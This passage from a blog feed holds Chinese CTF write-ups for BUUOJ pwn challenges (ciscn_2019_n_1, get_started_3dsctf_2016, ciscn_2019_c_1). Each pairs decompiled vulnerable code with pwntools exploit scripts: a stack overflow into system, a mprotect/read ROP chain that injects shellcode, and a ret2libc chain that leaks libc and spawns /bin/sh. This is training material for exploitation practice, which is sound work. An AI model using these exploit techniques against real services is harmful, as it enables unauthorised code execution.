src="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/20190803083016935.png" class="" title="在这里插入图片描述">]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_n_1 WP</title>
    <link href="/2020/01/13/ciscn_2019_n_1%20WP/"/>
    <url>/2020/01/13/ciscn_2019_n_1%20WP/</url>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-30h]</span><br>  <span class="hljs-keyword">float</span> v2; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = <span class="hljs-number">0.0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s guess the number.&quot;</span>);<br>  gets(&amp;v1);<br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">11.28125</span> )<br>    result = system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Its value should be 11.28125&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>看见==我还尝试了一下’a’ * offset + ‘11.28215’……</p><p>然后南梦一句：这不是有gets，你直接跳system不就好了。。。。</p><p>哎</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment">#sh = process(&quot;./ciscn_2019_n_1&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25925</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_n_1&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;er.&quot;</span>)<br>binsh = <span class="hljs-number">0x04006BE</span><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">56</span> <br>payload += p64(binsh)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>get_started_3dsctf_2016</title>
    <link href="/2020/01/13/get_started_3dsctf_2016/"/>
    <url>/2020/01/13/get_started_3dsctf_2016/</url>
    
    <content type="html"><![CDATA[<p>mprotect函数原型： int mprotect(void *addr, size_t len, int prot);</p><p>addr 内存启始地址</p><p>len 修改内存的长度</p><p>prot 内存的权限</p><p>[<img src="/2020/01/13/get_started_3dsctf_2016/A7DNJ_MC7NXWW8JVZG.png" class="" title="img"></p><p>所以得到exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>sh = elf.process()<br><span class="hljs-comment">#sh = remote(&#x27;node3.buuoj.cn&#x27;,27037)</span><br><br>pop3_ret = <span class="hljs-number">0x804951D</span> <span class="hljs-comment">#为了后续再能使用栈ret,我们得构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令</span><br>为啥要找<span class="hljs-number">3</span>个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈<br>完好.<br>mem_addr = <span class="hljs-number">0x80EB000</span> <span class="hljs-comment">#可读可写的内存,但不可执行</span><br>mem_size = <span class="hljs-number">0x1000</span> <span class="hljs-comment">#通过调试出来的值</span><br>mem_proc = <span class="hljs-number">0x7</span> <span class="hljs-comment">#可代表可读可写可执行</span><br>mprotect_addr = elf.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>payload_01 = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x38</span><br>payload_01 += p32(mprotect_addr)<br>payload_01 += p32(pop3_ret) <span class="hljs-comment">#执行完mprotect的返回地址,使esp往下+12</span><br><span class="hljs-comment">#mprotect 的三个参数</span><br>payload_01 += p32(mem_addr) <span class="hljs-comment">#mprotect函数参数1 修改的内存地址</span><br>payload_01 += p32(mem_size) <span class="hljs-comment">#mprotect函数参数2 修改的内存大小</span><br>payload_01 += p32(mem_proc) <span class="hljs-comment">#mprotect函数参数3 修改的权限</span><br>payload_01 += p32(read_addr) <span class="hljs-comment">#执行完pop3_ret后弹到read地址</span><br>payload_01 += p32(pop3_ret) <span class="hljs-comment">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span><br><span class="hljs-comment">#read 的三个参数</span><br>payload_01 += p32(<span class="hljs-number">0</span>) <span class="hljs-comment">#read函数参数1 ,从输入端读取</span><br>payload_01 += p32(mem_addr) <span class="hljs-comment">#读取到的内容复制到指向的内存里</span><br>payload_01 += p32(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#读取大小</span><br>payload_01 += p32(mem_addr) <span class="hljs-comment">#执行完read后ret esi</span><br>sh.sendline(payload_01)<br>payload_sh = asm(shellcraft.sh(),arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>sh.sendline(payload_sh)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>来源：<a href="https://www.b1ndsec.cn/?p=371">https://www.b1ndsec.cn/?p=371</a></p><h2 id="LYXF-Logan-的WP"><a href="#LYXF-Logan-的WP" class="headerlink" title="LYXF-Logan 的WP"></a><a href="https://www.cnblogs.com/lyxf/">LYXF-Logan</a> 的WP</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> 修改使用mprotec函数修改内存的权限为可读可写可执行,然后在该内存中写入自己的shellcode,执行该代码即可.<br>首先按先说一下mprotect函数:原型如下<br><span class="hljs-keyword">int</span> mprotect(<span class="hljs-keyword">void</span> *addr, size_t len, <span class="hljs-keyword">int</span> prot);<br>addr 内存启始地址<br>len  修改内存的长度<br>prot 内存的权限<br>要想达到内存可执行的目的,我们看一下哪个内存最好修改,使用edb-debuger查看,或<br>$ .<span class="hljs-regexp">/ ../I</span>nsertPic &amp;<br>$ cat <span class="hljs-regexp">/proc/</span>[you_pid]/maps 查看内存区域<br>可以查看到,内存可读可写的地址为: <span class="hljs-number">0</span>x0x80EB000 ,所以我们对该内存进行增加一个权限<br><br>如何进行内存的权限修改,思路:<br><span class="hljs-number">1</span>.栈溢出ret 到 mprotect函数地址,我来解释一下 <span class="hljs-keyword">call</span> 指令, <span class="hljs-keyword">call</span> = <span class="hljs-keyword">push</span> + jmp<br>所以直接ret后要留一个返回地址,因为ret 就相当于 jmp 到 mprotect,为了完整的回来,所以在<br>mprotect地址后在压入一个返回地址.<br><span class="hljs-number">2</span>.在<span class="hljs-number">32</span>为系统中传参是使用栈传参,择第一个参数先<span class="hljs-keyword">push</span>,第二个再<span class="hljs-keyword">push</span>....<br>所以基本的payload可以构思如下:<br>payload = <span class="hljs-string">&#x27;A&#x27;</span> + <span class="hljs-number">0</span>x38 + p32(mprotect_addr)<br>payaloda += p32(ret_addr) + p32(argu1) + p32(argu2) +p32 (argu3)<br><br>这里的mprotect_addr就是我们要跳转到mprotect函数的地址<br>ret_addr 为 mprotect函数执行完后的地址.<br>argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 <span class="hljs-number">0</span>x0x80EB000 (edb-debuger查看得到)<br>argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 <span class="hljs-number">0</span>x1000 (<span class="hljs-number">0</span>x1000通过程序启动时查看该内存块的大小的到的)<br>argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 <span class="hljs-number">7</span> = <span class="hljs-number">4</span> + <span class="hljs-number">2</span> +<span class="hljs-number">1</span> (rwx)<br><br>为了后续再能使用栈ret,我们的构造一下栈的布局,因为mprotect函数使用到了<span class="hljs-number">3</span>个参数,我们就找存在<span class="hljs-number">3</span>个连续<span class="hljs-keyword">pop</span>的指令<br>为啥要找<span class="hljs-number">3</span>个<span class="hljs-keyword">pop</span>,也就是在正常情况下,函数传参是使用<span class="hljs-keyword">push</span>，所以要为了堆栈还原,函数调用结束时就使用<span class="hljs-keyword">pop</span>来保证堆栈<br>完好.<br><br>使用 ROPgadget --binary ../InsertPic --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-keyword">pop</span><br>存在<span class="hljs-keyword">pop</span>的一些指令地址,可以发现:<br><span class="hljs-number">0</span>x0804f460 : <span class="hljs-keyword">pop</span> ebx ; <span class="hljs-keyword">pop</span> esi ; <span class="hljs-keyword">pop</span> ebp ; ret<br>那我们就得到了该地址.<br>上面的ret_addr就填写<span class="hljs-number">0</span>x0804f460<br>好下面我们就要构思如何将自己的shellcode写入内存再执行,使用<span class="hljs-keyword">read</span>函数写入.<br><span class="hljs-keyword">read</span>函数原型:<br>ssize_t <span class="hljs-keyword">read</span>(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *buf, size_t <span class="hljs-keyword">count</span>);<br>fd 设为<span class="hljs-number">0</span>时就可以从输入端读取内容<br>buf 设为我们想要执行的内存地址<br><span class="hljs-keyword">size</span> 适当大小就可以<br><br>...................<br></code></pre></td></tr></table></figure><h4 id="最终exp如下"><a href="#最终exp如下" class="headerlink" title="最终exp如下:"></a>最终exp如下:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>sh = elf.process()<br>sh = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">28576</span>)<br><br>pop3_ret = <span class="hljs-number">0x804951D</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">pop esi</span><br><span class="hljs-string">pop edi</span><br><span class="hljs-string">pop ebp</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>esi = <span class="hljs-number">0x80EB000</span> <span class="hljs-comment">#可读可写的内存,但不可执行</span><br>edi = <span class="hljs-number">0x1000</span>    <span class="hljs-comment">#通过调试出来的值</span><br>ebp = <span class="hljs-number">0x7</span>       <span class="hljs-comment">#可代表可读可写可执行</span><br><br>mprotect_addr = elf.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload_01 = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x38</span><br>payload_01 += p32(mprotect_addr)<br>payload_01 += p32(pop3_ret) <span class="hljs-comment">#执行完mprotect的返回地址,使esp往下+12</span><br><br><span class="hljs-comment">#mprotect 的三个参数</span><br>payload_01 += p32(esi)   <span class="hljs-comment">#mprotect函数参数1 修改的内存地址</span><br>payload_01 += p32(edi)   <span class="hljs-comment">#mprotect函数参数2 修改的内存大小</span><br>payload_01 += p32(ebp)   <span class="hljs-comment">#mprotect函数参数3 修改的权限</span><br><br>payload_01 += p32(read_addr) <span class="hljs-comment">#执行完pop3_ret后弹到read地址</span><br><br>payload_01 += p32(pop3_ret)  <span class="hljs-comment">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span><br><br><span class="hljs-comment">#read 的三个参数</span><br>payload_01 += p32(<span class="hljs-number">0</span>)     <span class="hljs-comment">#read函数参数1 ,从输入端读取</span><br>payload_01 += p32(esi)   <span class="hljs-comment">#读取到的内容复制到指向的内存里</span><br>payload_01 += p32(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#读取大小</span><br><br>payload_01 += p32(esi)   <span class="hljs-comment">#执行完read后ret esi</span><br><br>sh.sendline(payload_01)<br>payload_sh = asm(shellcraft.sh(),arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>) <br><br>sh.sendline(payload_sh)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p><a href="http://www.bubuko.com/infodetail-3355135.html">get_started_3dsctf_2016-Pwn</a></p><p>标签：<a href="http://www.bubuko.com/so/1/active">active</a>  <a href="http://www.bubuko.com/so/1/bin">bin</a>  <a href="http://www.bubuko.com/so/1/lag">lag</a>  <a href="http://www.bubuko.com/so/1/大小">大小</a>  <a href="http://www.bubuko.com/so/1/art">art</a>  <a href="http://www.bubuko.com/so/1/ger">ger</a>  </p><p>原文：<a href="https://www.cnblogs.com/lyxf/p/12113401.html">https://www.cnblogs.com/lyxf/p/12113401.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buu-ciscn_2019-c_1 WP</title>
    <link href="/2020/01/13/buu-ciscn_2019-c_1%20WP/"/>
    <url>/2020/01/13/buu-ciscn_2019-c_1%20WP/</url>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// local variable allocation has failed, the output may be wrong!</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  init(*(_QWORD *)&amp;argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEEEE                            hh      iii                &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;====================================================================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to this Encryption machine\n&quot;</span>);<br>  begin();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      fflush(<span class="hljs-number">0LL</span>);<br>      v4 = <span class="hljs-number">0</span>;<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>      getchar();<br>      <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I think you can do it by yourself&quot;</span>);<br>      begin();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">3</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    encrypt();<br>    begin();<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something Wrong!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">begin</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;====================================================================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.Encrypt&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.Decrypt&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.Exit&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your choice!&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">encrypt</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">size_t</span> v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  __int16 v3; <span class="hljs-comment">// [rsp+30h] [rbp-20h]</span><br><br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v0 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)x;<br>    <span class="hljs-keyword">if</span> ( v0 &gt;= <span class="hljs-built_in">strlen</span>(s) )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">96</span> || s[x] &gt; <span class="hljs-number">122</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">64</span> || s[x] &gt; <span class="hljs-number">90</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( s[x] &gt; <span class="hljs-number">47</span> &amp;&amp; s[x] &lt;= <span class="hljs-number">57</span> )<br>          s[x] ^= <span class="hljs-number">0xF</span>u;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        s[x] ^= <span class="hljs-number">0xE</span>u;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      s[x] ^= <span class="hljs-number">0xD</span>u;<br>    &#125;<br>    ++x;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Ciphertext&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(s);<br>&#125;<br></code></pre></td></tr></table></figure><p>发现gets(s);这样就好办了，随后那个加密就不用管了。</p><p>看看程序里边有无system(“\bin\sh”)</p><p>![image-20191215140307281](buu-ciscn_2019-c_1 WP/image-20191215140307281.png)</p><p>没有，那就只能通过libc来计算了</p><p>我们知道了lib，有了puts函数，所以我们可以leak libc的起始地址，计算libc地址，此时system和binsh都是嵌入到了内存当中的，所以我们就加上偏移即可调用</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>sh = process(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br><span class="hljs-comment">#sh = remote(&quot;node3.buuoj.cn&quot;,25817)</span><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) <span class="hljs-comment">#ida里可以看见</span><br>sh.recvuntil(<span class="hljs-string">&quot;!&quot;</span>)<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;ted&quot;</span>)<br>offset = <span class="hljs-number">87</span> <span class="hljs-comment">#ida双击gets(s)看得是0x50，加上前面的\x00就是80+8</span><br>pop_rdi_ret = elf.search(asm(<span class="hljs-string">&quot;pop rdi\nret\n&quot;</span>)).<span class="hljs-built_in">next</span>()<br>payload = <span class="hljs-string">&#x27;\x00&#x27;</span> + offset * <span class="hljs-string">&quot;a&quot;</span><br>payload += p64(pop_rdi_ret)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload += p64(<span class="hljs-number">0x400B28</span>) <span class="hljs-comment">#程序起始地址</span><br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&quot;Ciphertext&quot;</span>)<br><br>__libc_start_main = u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc + lib.search(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>).<span class="hljs-built_in">next</span>()<br>sh.recvuntil(<span class="hljs-string">&quot;!&quot;</span>)<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>payload = <span class="hljs-string">&#x27;\x00&#x27;</span> + offset * <span class="hljs-string">&quot;a&quot;</span><br>payload += p64(pop_rdi_ret)<br>payload += p64(binsh)<br>payload += p64(system + <span class="hljs-number">0x1b</span> )<br>payload += p64(<span class="hljs-number">0xdeadbeef</span>)<br>sh.sendline(payload)<br><br>log.success(<span class="hljs-string">&quot;__libc_start_main: &quot;</span> + <span class="hljs-built_in">hex</span>(__libc_start_main))<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AWD准备</title>
    <link href="/2020/01/13/AWD%E5%87%86%E5%A4%87/"/>
    <url>/2020/01/13/AWD%E5%87%86%E5%A4%87/</url>
    
